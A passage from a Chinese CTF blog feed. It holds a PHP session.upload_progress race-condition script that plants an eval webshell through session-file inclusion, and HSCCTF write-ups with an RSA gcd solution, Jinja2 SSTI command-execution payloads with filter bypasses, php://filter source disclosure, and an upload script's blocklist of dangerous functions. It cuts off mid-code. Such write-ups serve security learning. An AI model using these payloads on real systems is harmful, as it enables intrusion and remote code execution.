class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;&#x27;</span></span><br><span class="line">sessid=<span class="string">&quot;Err0r&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    filebytes = io.BytesIO(<span class="string">b&#x27;aaaa&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res = session.post(url,</span><br><span class="line">         data=&#123;</span><br><span class="line">                <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">            cookies=&#123;</span><br><span class="line">                <span class="string">&#x27;PHPSESSID&#x27;</span>:sessid</span><br><span class="line">                &#125;,</span><br><span class="line">            files=&#123;</span><br><span class="line">                <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;Err0r.txt&#x27;</span>,filebytes)</span><br><span class="line">                &#125;</span><br><span class="line">            )</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res = session.post(url+<span class="string">&quot;?file=/tmp/sess_&quot;</span>+sessid,</span><br><span class="line">                          data=&#123;</span><br><span class="line">                              <span class="string">&quot;1&quot;</span>:<span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span></span><br><span class="line">                          &#125;,</span><br><span class="line">                          cookies=&#123;</span><br><span class="line">                              <span class="string">&quot;PHPSESSID&quot;</span>:sessid</span><br><span class="line">                          &#125;</span><br><span class="line">                          )</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Err0r.txt&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Success!&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(res.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Retry&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="comment">#采用一个多线程发包（</span></span><br></pre></td></tr></table></figure><p>如果是利用 burp 发包的话</p><p>你需要准备一个session的包（包含有<code>PHPSESSID</code>和<code>PHP_SESSION_UPLOAD_PROGRESS</code>的那个包），然后一个文件包含包(<code>?file=/tmp/sess_id</code>的那个)</p><p>同时发包，赶在<code>sess_id</code>文件清除之前访问即可</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这个东西让我印象挺深刻的（&lt;/p&gt;
&lt;p&gt;最近一次接触还是在一道SQL注入的题目：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;[PwnThyBytes2019] BabySQL&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;由于login.php没有session存在的时候就不能访问，并且无法注入&lt;/p&gt;
&lt;p&gt;所以这时候就需要我们自己创造一个session&lt;/p&gt;
&lt;p&gt;所以session_upload_progress在这里就派上用场了&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;当session.upload_progress.enabled打开的时候（默认为On），我们传入PHP_SESSION_UPLOAD_PROGRESS的时候，php会执行session_start()，这个时候就会绕过没有session的限制&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后我就想起来之前session反序列化的时候好像也是用这个session_upload_progress的&lt;/p&gt;
&lt;p&gt;觉得这个东西挺有用的，就来学习一下&lt;/p&gt;
&lt;img src=&quot;/2023/03/04/%E7%9C%8B%E7%9C%8Bsession-upload-progress/1.png&quot; class title=&quot;awa&quot;&gt;
&lt;p&gt;&lt;s&gt;还有就是这个了（雾）&lt;/s&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF Web" scheme="http://example.com/categories/CTF-Web/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>HSCCTF 2th WriteUp</title>
    <link href="http://example.com/2023/02/19/HSCCTF-2th-WriteUp/"/>
    <id>http://example.com/2023/02/19/HSCCTF-2th-WriteUp/</id>
    <published>2023-02-19T03:30:24.000Z</published>
    <updated>2023-03-12T09:43:56.841Z</updated>
    
    <content type="html"><![CDATA[<p>又被薄纱了，哈哈哈</p><span id="more"></span><h1><span id="misc"> Misc</span></h1><h2><span id="signin"> SIGNIN</span></h2><p>关注公众号：中龙 红客突击队 发送：HSCCTF{TELLMEFLAG}获取flag即可</p><h1><span id="crypto"> Crypto</span></h1><h2><span id="ezrsa"> EZRSA</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> m</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>,n)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">M = m * e * <span class="number">1</span> * <span class="number">2022</span> * p</span><br><span class="line">c = <span class="built_in">pow</span>(M,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849</span></span><br><span class="line"><span class="comment"># c = 12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>尝试factordb分解失败</p><p>但是M=2022mep=k1p</p><p>n=pq=k2p</p><p>c = M^e mod n = (k1p)^e mod k2p =k3p mod k2p = k3p-k4k2p</p><p>结果是 n，c都含有p的因子</p><p>所以n和c的最大公因数就是p</p><p>得到p之后就可以得到q</p><p>之后就是rsa常规解法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">n = <span class="number">16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849</span></span><br><span class="line">c = <span class="number">12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p = gmpy2.gcd(n,c)</span><br><span class="line">q = n//p</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi) <span class="comment">#ed= 1 (mod phi(n))</span></span><br><span class="line">M = gmpy2.powmod(c,d,n)</span><br><span class="line">m = M // e // <span class="number">2022</span> // p</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h1><span id="web"> Web</span></h1><h2><span id="ezssti"> EZSSTI</span></h2><p>ssti模板注入，传参点是name</p><p>直接使用poc一把梭：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /f*&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是发现报错：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SyntaxError</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">    <span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).(<span class="string">&quot;nl /f*&quot;</span>).read()</span><br><span class="line">                     ^</span><br><span class="line">SyntaxError: invalid syntax</span><br></pre></td></tr></table></figure><p>对比发现popen被删除了，所以这里直接双写绕过即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popopenpen(&quot;cat /f*&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>回显：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I heard you wanted flag, Are you sure you can get it? &#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125; &#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125; &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125; &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125; &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;/f*&quot;).read()&#x27;</span>) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>应该是有过滤cat</p><p>所以换成nl</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popopenpen(&quot;nl /f*&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2023/02/19/HSCCTF-2th-WriteUp/1.png" class title="awa"><h2><span id="easyphy"> EasyPHY</span></h2><p>第一眼进去还以为是文件上传，于是传什么文件都被挡…</p><p>后来发现：<code>&lt;input type=&quot;submit&quot; name=&quot;acti0n&quot; placeholder=&quot;上传图片&quot; value=&quot;upload&quot; class='btn' id='b1'&gt;</code></p><p>name=acti0n…</p><p>所以应该是有传参点的，那么我们可以尝试获取view和upload的源码（文件包含）</p><p><code>acti0n=php://filter/convert.base64-encode/resource=view.php</code></p><p>发现被挡了，可以大小写绕过</p><p><code>acti0n=php://filter/convert.basE64-encode/resource=view.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;link type = <span class="string">&quot;text/css&quot;</span> rel = <span class="string">&quot;stylesheet&quot;</span> href = <span class="string">&quot;css/style.css&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;html lang = <span class="string">&quot;zh&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;title&gt;上传图片&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script type = <span class="string">&quot;text/javascript&quot;</span> color = <span class="string">&quot;0,0,255&quot;</span> opacity = <span class="string">&#x27;0.7&#x27;</span> zIndex = <span class="string">&quot;-2&quot;</span> count = <span class="string">&quot;99&quot;</span> src = <span class="string">&#x27;js/canvas-nest.min.js&#x27;</span>&gt;&lt;/script&gt; &lt;!-- 动态背景 --&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;h2&gt;上传你手里最好的图片!&lt;/h2&gt;</span><br><span class="line">&lt;p id = <span class="string">&quot;comment&quot;</span>&gt;If it is excellent enough, you will get the flag!&lt;/p&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span> = &quot;<span class="title">form1</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">form</span> <span class="title">action</span> = &quot;<span class="title">upload</span>.<span class="title">php</span>&quot; <span class="title">method</span> = &quot;<span class="title">post</span>&quot; <span class="title">accept</span>-<span class="title">charset</span> = &quot;<span class="title">utf</span>-8&quot; <span class="title">enctype</span> = &quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">name</span> = &quot;<span class="title">title</span>&quot; <span class="title">for</span> = &quot;<span class="title">file</span>&quot;&gt;图片:   &lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span> = &quot;<span class="title">file</span>&quot; <span class="title">name</span> = &quot;<span class="title">file</span>&quot; <span class="title">id</span> = &quot;<span class="title">file</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span> = &quot;<span class="title">submit</span>&quot; <span class="title">class</span> = &quot;<span class="title">button</span>&quot; <span class="title">name</span> = &quot;<span class="title">submit</span>&quot; <span class="title">value</span> = &quot;上传&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> </span></span><br><span class="line"><span class="class"><span class="title">error_reporting</span>(0);</span></span><br><span class="line"><span class="class">$<span class="title">dir</span> = &#x27;<span class="title">upload</span>/&#x27;.<span class="title">md5</span>($<span class="title">_SERVER</span>[&#x27;<span class="title">REMOTE_ADDR</span>&#x27;]).&#x27;/&#x27;;</span></span><br><span class="line"><span class="class"><span class="title">if</span>(!<span class="title">is_dir</span>($<span class="title">dir</span>)) </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>, <span class="number">0777</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">error_get_last</span>()[<span class="string">&#x27;message&#x27;</span>];</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Failed to make the directory&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$ans</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$tmp_name</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt;= <span class="number">204800</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;filesize too big.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$name</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;filename can not be empty!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(htaccess)|(user)|(\.\.)|(00)|(#)/i&#x27;</span>, <span class="variable">$name</span>) !== <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Hacker!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$ans</span> != IMAGETYPE_GIF) &amp;&amp; (<span class="variable">$ans</span> != IMAGETYPE_JPEG) &amp;&amp; (<span class="variable">$ans</span> != IMAGETYPE_PNG)) &#123;</span><br><span class="line"><span class="variable">$type</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;image/gif&#x27;</span> <span class="keyword">or</span> <span class="variable">$type</span> == <span class="string">&#x27;image/jpg&#x27;</span> <span class="keyword">or</span> <span class="variable">$type</span> == <span class="string">&#x27;image/png&#x27;</span> <span class="keyword">or</span> <span class="variable">$type</span> == <span class="string">&#x27;image/jpeg&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p align=\&quot;center\&quot;&gt;Don&#x27;t cheat me with Content-Type!&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;p align=\&quot;center\&quot;&gt;You can&#x27;t upload this kind of file!&lt;/p&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp_name</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(scandir)|(end)|(implode)|(eval)|(system)|(passthru)|(exec)|(chroot)|(chgrp)|(chown)|(shell_exec)|(proc_open)|(proc_get_status)|(ini_alter)|(ini_set)|(ini_restore)|(dl)|(pfsockopen)|(symlink)|(popen)|(putenv)|(syslog)|(readlink)|(stream_socket_server)|(error_log)/i&#x27;</span>, <span class="variable">$content</span>) !== <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;How dare you upload file with such dangerous function?&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$extension</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$name</span>, <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(png)|(jpg)|(jpeg)|(phar)|(gif)|(txt)|(md)|(exe)/i&#x27;</span>, <span class="variable">$extension</span>) === <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;&lt;p align=\&quot;center\&quot;&gt;You can&#x27;t upload this kind of file!&lt;/p&gt;&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$upload_file</span> = <span class="variable">$name</span>;</span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="variable">$upload_file</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p align=\&quot;center\&quot;&gt;Your file <span class="subst">$name</span> has been uploaded.&lt;br&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;上传失败&quot;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p align=\&quot;center\&quot;&gt;&lt;a href=\&quot;view.php\&quot; &gt;点我去看上传的文件&lt;/a&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="comment">#header(&quot;refresh:3;url=index.php&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到ban掉了很多危险函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 